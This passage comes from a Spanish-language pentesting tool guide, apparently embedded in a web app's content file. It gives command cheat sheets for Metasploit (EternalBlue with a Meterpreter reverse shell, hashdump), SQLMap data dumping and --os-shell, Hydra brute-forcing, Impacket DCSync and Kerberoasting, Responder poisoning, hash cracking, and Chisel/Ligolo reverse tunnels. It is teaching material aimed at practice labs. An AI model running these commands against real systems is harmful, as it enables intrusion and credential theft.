# 3. Enviar a Repeater: Click derecho > Send to Repeater
# 4. Modificar y reenviar parámetros

# Ataques comunes con Intruder:
# Posiciones: usuario=§admin§&password=§password§
# Payloads: lista de usuarios y contraseñas</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>PortSwigger Web Security Academy (gratuito)</li>
<li>TryHackMe: "Burp Suite" rooms</li>
<li>Documentación oficial: https://portswigger.net/burp</li>
</ul>

<h3>💣 3. Metasploit Framework — Explotación profesional</h3>
<p>Metasploit es el framework de explotación más popular. Miles de exploits, payloads y módulos auxiliares para todo tipo de plataformas.</p>

<h4>Características clave</h4>
<ul>
<li>Base de datos de exploits actualizada (msfupdate)</li>
<li>Múltiples payloads: reverse shell, bind shell, Meterpreter</li>
<li>Módulos auxiliares: escáneres, enumeración, fuzzing</li>
<li>Post-explotación: recolección de credenciales, escalado de privilegios</li>
<li>Integración con Nmap, Nessus y otras herramientas</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Iniciar Metasploit
msfconsole

# Buscar y usar un exploit
search ms17-010                        # Buscar EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
show options                           # Ver opciones requeridas
set RHOSTS 192.168.1.100               # Configurar target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50                 # Tu IP
run                                    # Ejecutar exploit

# Módulos auxiliares
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_version

# Post-explotación con Meterpreter
getsystem                              # Escalar a SYSTEM
hashdump                               # Dumpear hashes
sysinfo                                # Información del sistema
screenshot                             # Capturar pantalla</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>Offensive Security (PWK/OSCP)</li>
<li>Documentación: https://docs.metasploit.com</li>
<li>TryHackMe: "Metasploit" rooms</li>
</ul>

<h3>🗄️ 4. SQLMap — Inyección SQL automatizada</h3>
<p>SQLMap automatiza la detección y explotación de vulnerabilidades de inyección SQL. Soporta MySQL, PostgreSQL, Oracle, MSSQL, SQLite y más.</p>

<h4>Características clave</h4>
<ul>
<li>Detección automática de tipos de inyección (blind, error-based, time-based, out-of-band)</li>
<li>Extracción de bases de datos, tablas, columnas y datos</li>
<li>Bypass de WAF con scripts anti-detección (--tamper)</li>
<li>Ejecución de comandos en el servidor (--os-shell)</li>
<li>Lectura/escritura de archivos (--file-read/--file-write)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Detección básica
sqlmap -u "http://target.com/page?id=1" --batch

# Enumerar bases de datos
sqlmap -u "http://target.com/page?id=1" --dbs

# Extraer tablas de una base de datos
sqlmap -u "http://target.com/page?id=1" -D nombre_db --tables

# Dumpear datos
sqlmap -u "http://target.com/page?id=1" -D nombre_db -T usuarios --dump

# Con cookie y POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --cookie="session=abc123"

# Bypass de WAF con tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch

# Obtener shell del sistema
sqlmap -u "http://target.com/page?id=1" --os-shell</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>Documentación oficial: https://sqlmap.org</li>
<li>GitHub: sqlmapproject/sqlmap</li>
<li>TryHackMe: "SQL Injection" rooms</li>
</ul>

<h3>📁 5. Gobuster — Fuerza bruta de directorios y DNS</h3>
<p>Gobuster es una herramienta escrita en Go para hacer fuerza bruta sobre directorios/archivos web, subdominios DNS y buckets S3.</p>

<h4>Características clave</h4>
<ul>
<li>Alta velocidad gracias a Go (goroutines concurrentes)</li>
<li>Modos: dir (directorios), dns (subdominios), s3 (buckets), vhost (virtual hosts)</li>
<li>Soporta extensiones personalizadas (-x php,txt,html)</li>
<li>Códigos de estado para filtrar resultados</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Fuerza bruta de directorios
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt -t 50

# Fuerza bruta de subdominios
gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million.txt

# Virtual hosts
gobuster vhost -u http://target.com -w wordlist.txt

# Buckets S3
gobuster s3 -w wordlist.txt</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: OJ/gobuster</li>
<li>Wordlists: /usr/share/wordlists/ (Kali), SecLists</li>
</ul>

<h3>🔐 6. Hydra — Fuerza bruta de credenciales</h3>
<p>Hydra (THC-Hydra) es el atacante de fuerza bruta en red más popular. Soporta decenas de protocolos: SSH, FTP, HTTP, MySQL, RDP, SMB, SMTP, etc.</p>

<h4>Características clave</h4>
<ul>
<li>Más de 50 protocolos soportados</li>
<li>Multi-threaded para alta velocidad</li>
<li>Usuarios y contraseñas desde archivos</li>
<li>Soporta autenticación por formularios web (POST)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># SSH
hydra -l root -P passwords.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# SMB
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# Con servicio y puerto personalizado
hydra -l admin -P passwords.txt -s 2222 ssh://target.com</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: vanhauser-thc/thc-hydra</li>
<li>Viene preinstalado en Kali Linux</li>
</ul>

<h3>🔑 7. John the Ripper — Crackeo de contraseñas (CPU)</h3>
<p>John the Ripper es el crackeador de contraseñas clásico. Optimizado para CPU, soporta cientos de formatos de hash.</p>

<h4>Características clave</h4>
<ul>
<li>Soporta más de 300 formatos de hash (MD5, SHA1, bcrypt, NTLM, Kerberos, etc.)</li>
<li>Modos: wordlist, incremental (brute-force), markov, single</li>
<li>Reglas de mutación para variaciones de palabras</li>
<li>Distribuido (puede ejecutarse en clúster)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Identificar formato de hash
john --identify hash.txt

# Crackear con wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crackear con reglas (mutaciones)
john --wordlist=passwords.txt --rules hash.txt

# Mostrar resultados
john --show hash.txt

# Formato específico
john --format=nt --wordlist=rockyou.txt hash.txt

# Modo incremental (fuerza bruta, lento)
john --incremental hash.txt</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>Web oficial: https://www.openwall.com/john/</li>
<li>GitHub: openwall/john</li>
</ul>

<h3>⚡ 8. Hashcat — Crackeo de contraseñas (GPU)</h3>
<p>Hashcat es el crackeador más rápido del mundo. Aprovecha GPU (NVIDIA/AMD) para acelerar el crackeo de hashes hasta millones por segundo.</p>

<h4>Características clave</h4>
<ul>
<li>Aceleración por GPU (OpenCL, CUDA, Metal)</li>
<li>320+ tipos de hash soportados (-m)</li>
<li>Múltiples modos de ataque: wordlist, combinator, mask, rule-based, prince</li>
<li>Distribuido (hashcat-legacy)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Wordlist attack
hashcat -m 1000 -a 0 hashes.txt rockyou.txt          # NTLM (-m 1000)
hashcat -m 0 -a 0 hashes.txt rockyou.txt              # MD5 (-m 0)
hashcat -m 3200 -a 0 hashes.txt rockyou.txt           # bcrypt (-m 3200)

# Mask attack (fuerza bruta con patrones)
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?d?d     # 6 letras + 2 dígitos

# Combinator attack
hashcat -m 1000 -a 1 hashes.txt words1.txt words2.txt

# Rule-based
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mostrar resultados
hashcat -m 1000 --show hashes.txt

# Benchmark (rendimiento de tu GPU)
hashcat -b --benchmark-all</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>Web oficial: https://hashcat.net/hashcat/</li>
<li>Wiki: https://hashcat.net/wiki/</li>
<li>Kali Linux: hashcat preinstalado</li>
</ul>

<h3>🪟 9. enum4linux — Enumeración de Windows/Samba</h3>
<p>enum4linux es un wrapper de enum.exe para Linux. Extrae información de sistemas Windows y Samba: usuarios, recursos compartidos, políticas, OS info.</p>

<h4>Características clave</h4>
<ul>
<li>Enumeración de usuarios (RID cycling)</li>
<li>Listado de recursos compartidos (SMB shares)</li>
<li>Información del sistema operativo y dominio</li>
<li>Políticas de contraseñas</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Enumeración completa
enum4linux -a 192.168.1.100

# Enumerar solo usuarios
enum4linux -U 192.168.1.100

# Enumerar recursos compartidos
enum4linux -S 192.168.1.100

# Listar políticas de contraseñas
enum4linux -P 192.168.1.100

# Alternativa moderna: enum4linux-ng
enum4linux-ng -A 192.168.1.100</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: cirbuk/enum4linux</li>
<li>Preinstalado en Kali Linux</li>
</ul>

<h3>🧰 10. Impacket — Suite de protocolos Windows</h3>
<p>Impacket es una colección de scripts en Python para trabajar con protocolos Windows: SMB, MSRPC, Kerberos, LDAP, WMI, etc.</p>

<h4>Características clave</h4>
<ul>
<li>psexec.py — ejecución remota como Sysinternals PsExec</li>
<li>smbclient.py — cliente SMB interactivo</li>
<li>secretsdump.py — dumps de hashes NTDS (DC Sync)</li>
<li>GetUserSPNs.py — ataques Kerberoasting</li>
<li>GetNPUsers.py — ataques AS-REP Roasting</li>
<li>Mimikatz.py — trucos de post-explotación</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Ejecutar comando en Windows remoto
impacket-psexec usuario:password@192.168.1.100

# Dumpear hashes del controlador de dominio (DC Sync)
impacket-secretsdump -just-dc DOMINIO/admin:password@192.168.1.100

# Kerberoasting (extraer tickets TGS)
impacket-GetUserSPNs -request DOMINIO/usuario:password -dc-ip 192.168.1.100

# AS-REP Roasting (usuarios sin preauth)
impacket-GetNPUsers DOMINIO/ -usersfile users.txt -dc-ip 192.168.1.100

# SMB client interactivo
impacket-smbclient DOMINIO/usuario:password@192.168.1.100

# WMI execution
impacket-wmiexec DOMINIO/usuario:password@192.168.1.100

# Golden Ticket/Silver Ticket
impacket-ticketer -nthash HASH -domain DOMINIO -domain-sid SID usuario</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: SecureAuthCorp/impacket</li>
<li>Documentación: https://www.secureauth.com/labs/open-source-tools/impacket</li>
</ul>

<h3>📡 11. Responder — Envenenamiento LLMNR/NBT-NS</h3>
<p>Responder es un toolkit para envenenar protocolos de resolución de nombres en redes Windows: LLMNR, NBT-NS, MDNS. Captura hashes NTLMv1/v2.</p>

<h4>Características clave</h4>
<ul>
<li>Servidores falsos para todos los protocolos de resolución</li>
<li>Captura de hashes NTLMv1 y NTLMv2</li>
<li>Soporta HTTP, SMB, SQL, LDAP, FTP, POP3, IMAP, SMTP</li>
<li>Multi-relay (con MultiRelay.py)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Modo básico (analizar)
responder -I eth0 -A

# Modo ofensivo (envenenar y capturar)
responder -I eth0 -w -r -f

# Para relay de hashes (con impacket)
impacket-ntlmrelayx -tf targets.txt -smb2support</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: lgandx/Responder</li>
<li>Preinstalado en Kali Linux</li>
<li>TryHackMe: "Responder" rooms</li>
</ul>

<h3>🕳️ 12. Chisel — Túneles y pivoting</h3>
<p>Chisel es una herramienta de tunneling rápida escrita en Go. Crea canales TCP/UDP a través de HTTP/HTTPS, ideal para pivoting en redes internas.</p>

<h4>Características clave</h4>
<ul>
<li>Cliente y servidor en un solo binario</li>
<li>Túneles sobre HTTP/HTTPS (evade firewalls)</li>
<li>Soporta reverse forwarding y SOCKS5</li>
<li>Binario pequeño y estático (fácil de subir a víctima)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Servidor (atacante)
chisel server -p 8000 --reverse

# Cliente (víctima) — reverse port forwarding
chisel client http://192.168.1.50:8000 R:8888:127.0.0.1:3389

# SOCKS5 proxy
# Servidor: chisel server -p 8000 --reverse
# Cliente: chisel client http://192.168.1.50:8000 R:1080:socks
# Después: proxychains nmap -sV -p 80 10.10.10.10</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: jpillora/chisel</li>
<li>TryHackME: "Chisel" rooms</li>
</ul>

<h3>🔄 13. Ligolo-ng — Pivoting avanzado</h3>
<p>Ligolo-ng es una herramienta de pivoting moderna que crea un túnel de red completo (como una VPN inversa) a través de la máquina víctima.</p>

<h4>Características clave</h4>
<ul>
<li>Crea interfaz TUN/TUN en atacante para acceso directo a redes internas</li>
<li>Enrutamiento automático</li>
<li>No requiere configuración de proxy</li>
<li>Binario pequeño y fácil de compilar para múltiples plataformas</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># En atacante (servidor)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.0.0/24 dev ligolo
ligolo-ng -self-cert

# En víctima (cliente)
ligolo-ng -connect 192.168.1.50:443 -ignore-cert

# En la sesión del servidor:
# session 1
# start</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: nicocha30/ligolo-ng</li>
<li>Documentación: https://github.com/nicocha30/ligolo-ng/wiki</li>
</ul>

<h3>🎯 14. FFUF — Fuzzing web rápido</h3>
<p>FFUF (Fuzz Faster U Fool) es una herramienta de fuzzing web escrita en Go. Descubre endpoints, parámetros, cabeceras y mucho más mediante fuerza bruta.</p>

<h4>Características clave</h4>
<ul>
<li>Alta velocidad con concurrencia masiva</li>
<li>Fuzzing de directorios, archivos, parámetros GET/POST</li>
<li>Fuzzing de cabeceras HTTP y cookies</li>
<li>Filtrado por código de estado, tamaño, líneas o palabras</li>
<li>Recursión automática (-recursion)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Fuzzing de directorios
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Fuzzing con extensiones
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak

# Fuzzing de parámetros GET
ffuf -u "http://target.com/page?FUZZ=test" -w params.txt

# Fuzzing de parámetros POST
ffuf -u http://target.com/login -X POST -d "user=admin&password=FUZZ" -w passwords.txt -H "Content-Type: application/x-www-form-urlencoded"

# Filtrado por código de estado
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 403,404

# Recursión automática
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: ffuf/ffuf</li>
<li>Documentación: https://github.com/ffuf/ffuf/wiki</li>
</ul>

<h3>🌍 15. Subfinder — Descubrimiento de subdominios pasivo</h3>
<p>Subfinder es una herramienta de descubrimiento de subdominios pasivo construida para ser la más rápida y fiable. Usa múltiples fuentes OSINT.</p>

<h4>Características clave</h4>
<ul>
<li>Más de 30 fuentes de OSINT (Virustotal, SecurityTrails, Censys, Shodan, etc.)</li>
<li>Alta velocidad y concurrencia</li>
<li>Salida en múltiples formatos (txt, json)</li>
<li>Fácil integración con otras herramientas</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Búsqueda básica de subdominios
subfinder -d target.com

# Salida a archivo
subfinder -d target.com -o subdominios.txt

# Usar todas las fuentes (más lento pero completo)
subfinder -d target.com -all

# Silencioso (solo resultados)
subfinder -d target.com -silent

# Con API keys configuradas en ~/.config/subfinder/config.yaml
subfinder -d target.com -o subdominios.txt -recursive</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: projectdiscovery/subfinder</li>
<li>Documentación: https://docs.projectdiscovery.io/tools/subfinder</li>
</ul>

<h3>☢️ 16. Nuclei — Escaneo de vulnerabilidades basado en templates</h3>
<p>Nuclei es un motor de escaneo de vulnerabilidades rápido y extensible basado en templates YAML. Envía peticiones a targets y compara respuestas con templates.</p>

<h4>Características clave</h4>
<ul>
<li>Miles de templates de vulnerabilidades (community-driven)</li>
<li>Protocolos: HTTP, TCP, DNS, SSL, etc.</li>
<li>Alta velocidad con concurrencia masiva</li>
<li>Fácil creación de templates personalizados</li>
<li>Integración con otras herramientas de ProjectDiscovery</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Escaneo básico con todas las templates
nuclei -u http://target.com

# Escaneo con templates específicas
nuclei -u http://target.com -t cves/ -t exposures/

# Escaneo de múltiples targets
nuclei -l targets.txt

# Categorías de templates:
# -t cves/       Vulnerabilidades CVE
# -t exposures/  Exposición de datos/configuración
# -t misconfig/  Malas configuraciones
# -t tech/       Detección de tecnologías

# Salida detallada
nuclei -u http://target.com -severity critical,high -o resultados.txt

# Actualizar templates
nuclei -update-templates</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>GitHub: projectdiscovery/nuclei</li>
<li>Documentación: https://docs.projectdiscovery.io/tools/nuclei</li>
<li>Templates: https://github.com/projectdiscovery/nuclei-templates</li>
</ul>

<h3>📊 Resumen de herramientas por fase de pentesting</h3>
<table>
<tr><th>Fase</th><th>Herramientas</th></tr>
<tr><td>Reconocimiento</td><td>Nmap, Subfinder, Gobuster (dns)</td></tr>
<tr><td>Enumeración</td><td>Nmap (-sV -sC), enum4linux, Gobuster (dir), FFUF</td></tr>
<tr><td>Explotación</td><td>Metasploit, SQLMap, Hydra, Burp Suite</td></tr>
<tr><td>Post-explotación</td><td>Impacket, Chisel, Ligolo-ng, Responder</td></tr>
<tr><td>Crackeo</td><td>John, Hashcat</td></tr>
<tr><td>Escaneo masivo</td><td>Nuclei, FFUF</td></tr>
</table>

<div class="guide-callout tip">💡 <strong>Próximos pasos:</strong> Practica cada herramienta en entornos controlados (HackTheBox, TryHackMe, VulnHub). No hace falta que domines todas — especialízate en las que más se alineen con tu rol (web, red, Active Directory, etc.).</div>
</div>`
    }
  ]
};
